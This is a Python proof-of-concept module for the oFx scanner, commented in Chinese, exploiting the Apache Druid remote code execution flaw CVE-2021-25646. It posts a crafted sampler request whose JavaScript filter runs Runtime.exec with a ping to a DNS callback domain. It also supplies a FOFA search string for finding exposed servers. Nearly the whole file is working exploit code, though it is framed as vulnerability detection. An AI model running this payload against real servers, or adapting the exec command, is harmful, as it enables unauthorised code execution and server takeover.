# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,get_ceye_dns,verify_ceye_dns
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Apache Druid 远程代码执行漏洞 (CVE-2021-25646)",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Apache Druid",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。
            近日，Apache Druid官方发布安全更新，修复了由阿里云安全发现的CVE-2021-25646 Apache Druid 远程代码执行漏洞。
            由于Apache Druid 默认情况下缺乏授权认证，攻击者可直接构造恶意请求执行任意代码，控制服务器。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="APACHE-Druid"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        success,dns_flag = get_ceye_dns()
        if success == False:
            return [False,dns_flag]

        url = self.target + "/druid/indexer/v1/sampler?for=filter" # url自己按需调整
        data = """{"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#sv.wikipedia\\\",\\\"timestamp\\\":\\\"2016-06-27T00:00:11.080Z\\\",\\\"flags\\\":\\\"NB\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"Salo Toraut\\\",\\\"diffUrl\\\":\\\"https://sv.wikipedia.org/w/index.php?oldid=36099284&rcid=89369918\\\",\\\"added\\\":31,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":false,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {return java.lang.Runtime.getRuntime().exec('ping %s')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}""" % dns_flag

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/json"
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            flager = verify_ceye_dns(dns_flag)

            if flager == True:
                vuln = [True,dns_flag]
            elif flager == False:
                vuln = [False,dns_flag]
            else:
                vuln = [False,flager]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()